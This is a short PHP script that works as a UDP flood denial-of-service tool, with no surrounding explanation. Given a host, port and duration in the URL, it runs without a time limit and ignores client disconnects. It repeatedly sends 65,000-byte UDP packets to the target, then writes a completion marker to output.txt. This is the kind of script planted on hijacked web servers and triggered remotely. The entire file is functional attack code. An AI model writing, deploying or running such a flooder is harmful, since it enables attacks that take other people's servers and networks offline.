<?php

if (isset($_GET['host'])&&isset($_GET['time']))
{
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);

    $exec_time = $_GET['time'];

    $time = time();
    //print "Started: ".time('d-m-y h:i:s')."<br>";
    $max_time = $time+$exec_time;

    $host = $_GET['host'];

    for($i=0;$i<65000;$i++)
	{
		$out .= 'X';
    }
    while(1)
	{
		$packets++;
		if(time() > $max_time)
		{
			break;
		}
		$port = $_GET['port'];
		$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
		if($fp)
		{
			fwrite($fp, $out);
			fclose($fp);
		}
    }
	$fp = fopen('output.txt', 'w');
	fwrite($fp, '1');
	fclose($fp);
}
?>